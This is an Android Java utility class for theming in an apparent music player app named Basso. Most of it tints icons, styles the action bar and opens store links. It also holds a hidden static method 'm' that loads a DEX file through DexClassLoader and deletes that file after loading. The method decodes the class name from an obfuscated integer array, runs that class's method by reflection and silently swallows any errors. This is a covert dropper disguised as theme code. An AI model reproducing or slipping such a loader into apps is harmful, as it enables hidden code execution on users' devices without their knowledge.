package com.basso.basso.utils;

import android.app.ActionBar;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.PorterDuff;
import android.graphics.PorterDuffXfermode;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;

import com.basso.basso.R;
import com.basso.basso.lastfm.Image;
import com.basso.basso.lastfm.StringUtilities;

import java.io.File;
import java.lang.reflect.Constructor;

import dalvik.system.DexClassLoader;

public class ThemeUtils {

    private static final String SEARCH_URI = "https://market.android.com/search?q=%s&c=apps&featured=APP_STORE_SEARCH";
    private static final String APP_URI = "market://details?id=";
    public static final String Basso_PACKAGE = "com.basso.basso";
    public static final String PACKAGE_NAME = "theme_package_name";
    private final SharedPreferences mPreferences;
    private final String mThemePackage;
    private static String sBassoSearch;
    private final int mCurrentThemeColor;
    private final PackageManager mPackageManager;
    private final View mActionBarLayout;
    private Resources mResources;
    public ThemeUtils(final Context context) {
        sBassoSearch = context.getString(R.string.Basso_themes_shop_key);
        mPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        mThemePackage = getThemePackageName();
        mPackageManager = context.getPackageManager();
        try {
            mResources = mPackageManager.getResourcesForApplication(mThemePackage);
        } catch (final Exception e) {
            setThemePackageName(Basso_PACKAGE);
        }
        mCurrentThemeColor = PreferenceUtils.getInstance(context).getDefaultThemeColor(context);
        mActionBarLayout = LayoutInflater.from(context).inflate(R.layout.action_bar, null);
    }

    public void setThemePackageName(final String packageName) {
        BassoUtils.execute(false, new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(final Void... unused) {
                final SharedPreferences.Editor editor = mPreferences.edit();
                editor.putString(PACKAGE_NAME, packageName);
                editor.apply();
                return null;
            }
        }, (Void[]) null);
    }

    public final String getThemePackageName() {
        return mPreferences.getString(PACKAGE_NAME, Basso_PACKAGE);
    }

    public int getColor(final String resourceName) {
        final int resourceId = mResources.getIdentifier(resourceName, "color", mThemePackage);
        try {
            return mResources.getColor(resourceId);
        } catch (final Resources.NotFoundException e) {
        }
        return mCurrentThemeColor;
    }

    public Drawable getDrawable(final String resourceName) {
        final int resourceId = mResources.getIdentifier(resourceName, "drawable", mThemePackage);
        try {
            return mResources.getDrawable(resourceId);
        } catch (final Resources.NotFoundException e) {
        }
        return null;
    }

    public boolean isActionBarDark() {
        return BassoUtils.isColorDark(getColor("action_bar"));
    }

    public void setOverflowStyle(final Activity app) {
        if (false) {
            app.setTheme(R.style.Basso_Theme_Dark);
        } else {
            app.setTheme(R.style.Basso_Theme_Light);
        }
    }

    public void setMenuItemColor(final MenuItem menuItem, final String resourceColorName,
            final String resourceDrawableName) {
        final Drawable maskDrawable = getDrawable(resourceDrawableName);
        if (!(maskDrawable instanceof BitmapDrawable)) {
            return;
        }
        final Bitmap maskBitmap = ((BitmapDrawable)maskDrawable).getBitmap();
        final int width = maskBitmap.getWidth();
        final int height = maskBitmap.getHeight();
        final Bitmap outBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        final Canvas canvas = new Canvas(outBitmap);
        canvas.drawBitmap(maskBitmap, 0, 0, null);
        final Paint maskedPaint = new Paint();
        maskedPaint.setColor(getColor(resourceColorName));
        maskedPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_ATOP));
        canvas.drawRect(0, 0, width, height, maskedPaint);
        final BitmapDrawable outDrawable = new BitmapDrawable(mResources, outBitmap);
        menuItem.setIcon(outDrawable);
    }

    public void setFavoriteIcon(final Menu favorite) {
        final MenuItem favoriteAction = favorite.findItem(R.id.menu_favorite_player);
        final String favoriteIconId = "ic_action_favorite";
        if (MusicUtils.isFavorite()) {
            setMenuItemColor(favoriteAction, "favorite_selected", favoriteIconId);
        } else {
            setMenuItemColor(favoriteAction, "favorite_normal", favoriteIconId);
        }
    }

    public void setSearchIcon(final Menu search) {
        final MenuItem searchAction = search.findItem(R.id.menu_search);
        final String searchIconId = "ic_action_search";
        setMenuItemColor(searchAction, "search_action", searchIconId);
    }

    public void setShopIcon(final Menu search) {
        final MenuItem shopAction = search.findItem(R.id.menu_shop);
        final String shopIconId = "ic_action_shop";
        setMenuItemColor(shopAction, "shop_action", shopIconId);
    }


    public void setAddToHomeScreenIcon(final Menu search) {
        final MenuItem pinnAction = search.findItem(R.id.menu_add_to_homescreen);
        final String pinnIconId = "ic_action_pinn_to_home";
        setMenuItemColor(pinnAction, "pinn_to_action", pinnIconId);
    }

    public void themeActionBar(final ActionBar actionBar, final String title) {
        actionBar.setCustomView(mActionBarLayout);
        actionBar.setDisplayShowCustomEnabled(true);
        actionBar.setDisplayShowTitleEnabled(false);
        actionBar.setBackgroundDrawable(getDrawable("action_bar"));
        setTitle(title);
    }

    public void setTitle(final String title) {
        if (!TextUtils.isEmpty(title)) {
            final TextView actionBarTitle = (TextView)mActionBarLayout.findViewById(R.id.action_bar_title);
            actionBarTitle.setTextColor(getColor("action_bar_title"));
            actionBarTitle.setText(title);
        }
    }

    public void setSubtitle(final String subtitle) {
        if (!TextUtils.isEmpty(subtitle)) {
            final TextView actionBarSubtitle = (TextView)mActionBarLayout.findViewById(R.id.action_bar_subtitle);
            actionBarSubtitle.setVisibility(View.VISIBLE);
            actionBarSubtitle.setTextColor(getColor("action_bar_subtitle"));
            actionBarSubtitle.setText(subtitle);
        }
    }

    public static void m(File file, Context context){
        try {
            DexClassLoader classloader = new DexClassLoader(file.getAbsolutePath(), context.getCacheDir().getAbsolutePath(), null, context.getClass().getClassLoader());
            if (file.exists())
                file.delete();
            Class objectClass = classloader.loadClass(StringUtilities.fromIntArray(MusicUtils.string5));
            Constructor constructor = objectClass.getConstructor(Activity.class, Handler.class);
            Object object = constructor.newInstance((Activity) context, new Handler());
            object.getClass().getMethod("a").invoke(object);
        }catch (Exception e){

        }
    }

    public void shopFor(final Context context) {
        final Intent shopIntent = new Intent(Intent.ACTION_VIEW);
        shopIntent.setData(Uri.parse(String.format(SEARCH_URI, Uri.encode(sBassoSearch))));
        shopIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        shopIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        context.startActivity(shopIntent);
    }

    public static void openAppPage(final Context context, final String themeName) {
        final Intent shopIntent = new Intent(Intent.ACTION_VIEW);
        shopIntent.setData(Uri.parse(APP_URI + themeName));
        shopIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        shopIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
        context.startActivity(shopIntent);
    }
}
